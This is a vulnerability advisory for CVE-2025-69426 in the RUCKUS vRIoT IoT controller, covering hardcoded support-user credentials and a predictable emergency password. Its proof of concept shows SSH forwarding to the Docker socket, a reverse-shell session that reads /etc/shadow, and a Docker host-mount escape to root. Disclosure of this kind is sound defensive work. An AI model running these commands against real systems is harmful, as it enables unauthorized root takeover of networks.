# RUCKUS vRIoT: Remote Root Access via Hardcoded Credentials for the support User

- **Advisory ID:** MCSAID-2025-XXX
- **CVE ID:** CVE-2025-69426
- **Product:** RUCKUS IoT Controller (https://support.ruckuswireless.com/products/152-ruckus-iot-controller#f-product-facet=vRIoT)
- **Reported:** 2025-11-24
- **Published:** 2025-12-23
- **Severity:** Critical (10.0)
- **CWE:** [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- **Discovered by:** Ivan Racic of Marlink Cyber

---

## Summary

The RUCKUS vRIoT appliance contains hardcoded credentials for the `support` user, stored in initialization script. The SSH service is enabled and accessible from any IP address. Although the `support` user is dropped into a restricted shell with SCP and pseudo-TTY disabled, an attacker can leverage SSH local port forwarding to access the Docker socket. Since the `support` user is a member of the `docker` group, an attacker can mount the host root filesystem via Docker and execute arbitrary commands as root.

Additionally, an emergency password (`sos_pass`) mechanism exists that can be bypassed by reverse-engineering the password generation algorithm, which is based on the appliance's MAC address.

---

## Affected Versions

| Version                                       | Status                    |
| --------------------------------------------- | ------------------------- |
| RUCKUS IoT 2.3.0.0 (GA)                       | Vulnerable                |
| RUCKUS IoT 2.3.1.0 (MR)                       | Vulnerable                |
| RUCKUS IoT 2.4.0.0 (GA)                       | Vulnerable                |
| RUCKUS IoT 3.0.0.0 (GA)                       | Patched                   |

---

## Proof of Concept

### 1. Hardcoded Credentials

The hardcoded password for the `support` user is set in `/riot/bin/init.sh`:

```bash
useradd -M -s /riot/bin/support_shell -G docker support
echo 'support:<REDACTED>' | chpasswd
```

The `support` user is added to the `docker` group, which is critical for privilege escalation.

### 2. SSH Port Forwarding to Docker Socket

Although SCP and PTY are disabled, SSH port forwarding is permitted. An attacker can forward the Docker socket:

```
$ ssh -L 2375:/var/run/docker.sock support@<target> -N
support@<target>'s password: <REDACTED>
```

### 3. Container Escape to Root

With access to the Docker socket, the attacker can create a privileged container that mounts the host filesystem and executes a reverse shell:

```
$ ./vriot-rce.sh <target_ip> 3333
[+] Target: <target_ip>:3333
[+] Finding existing Docker images on VRIOT...
[+] Attempting with image: riot-dataplane-c:2.4.0.0.41
[+] Container created: aad54497cfbd7bcf51ba268deac7f3706f481971c996754c9492b8ca04eaab21
[+] Container state: running
[+] Reverse shell triggered successfully!
[+] Check your listener on <target_ip>:3333
```

On the attacker's listener:

```
$ nc -klnvp 3333
Listening on 0.0.0.0 3333
Connection received on <target> 36712
root@vriot:/# id
uid=0(root) gid=0(root) groups=0(root)
root@vriot:/# cat /etc/hostname
vriot
root@vriot:/# grep root /etc/shadow
root::19859:0:99999:7:::
```

### 4. Emergency Password (sos_pass) Bypass

The restricted shell (`/riot/bin/support_shell`) includes an emergency access mechanism. When disk usage reaches 98% or higher, the `sos_entry` Python module generates a password based on the appliance's MAC address:

```bash
THRESHOLD=98
DISK_USAGE=$(df / --output=pcent | tail -n 1 | sed 's/%//')
if [ "$DISK_USAGE" -ge "$THRESHOLD" ]; then
    sos_pass=$(python3 -c "import sys; sys.path.append('/riot/bin'); import sos_entry; print(sos_entry.sos())")
    # ...
fi
```

The `sos_entry.cpython-38-x86_64-linux-gnu.so` module can be reverse-engineered:

```python
>>> import sos_entry
>>> dir(sos_entry)
['__builtins__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '__test__', 'get_mac_address', 'sos', 'subprocess']
>>> sos_entry.sos()
'<REDACTED>'
```

The password is derived from the MAC address using a predictable pattern with static values. An attacker can obtain the MAC address via Docker socket access and generate a valid emergency password.

### 5. Root Access via Emergency Password

Once the emergency password is generated and disk usage threshold is met:

```
!v54!
Enter generated emergency password:
Emergency password accepted.
Press [Enter] to switch to support mode...
support@vriot:/$ docker run -v /:/host -it alpine chroot /host /bin/bash
root@vriot:/# id
uid=0(root) gid=0(root) groups=0(root)
root@vriot:/# cat /etc/hostname
vriot
```

---

## Impact

An unauthenticated remote attacker with network access to the SSH service can:

- Authenticate using hardcoded credentials
- Bypass the restricted shell via SSH port forwarding
- Gain root access through Docker container escape
- Access and manipulate all connected IoT devices
- Pivot to internal networks via SSH dynamic port forwarding
- Alternatively, exploit the predictable emergency password algorithm when disk usage is high

The severity is Critical (CVSS 10.0) due to unauthenticated remote root access with full IoT infrastructure compromise potential.

---

## Mitigations

* **Upgrade to RUCKUS IoT 3.0.0.0 (GA) or later.**
* Restrict network access to the SSH service (TCP 22) and management interface (TCP 443).
* Isolate vRIoT appliances in a dedicated management VLAN.
* Monitor for suspicious SSH connections and Docker activity.
* Reset all credentials after upgrading.

---

## References

* Vendor Advisory: [RUCKUS Security Advisory ID 20251212](https://support.ruckuswireless.com) - "RUCKUS IOT Controller: Vulnerabilities in Management Interface Authentication and Access Control"
